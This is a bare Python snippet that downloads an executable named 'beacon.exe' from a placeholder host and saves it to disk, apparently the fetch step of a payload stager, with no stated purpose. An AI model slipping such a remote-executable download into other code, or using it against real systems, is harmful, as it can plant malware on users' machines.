import requests


r = requests.get("https://www.example.com/beacon.exe")
with open("beacon.exe", "wb") as f:
    f.write(r.content)
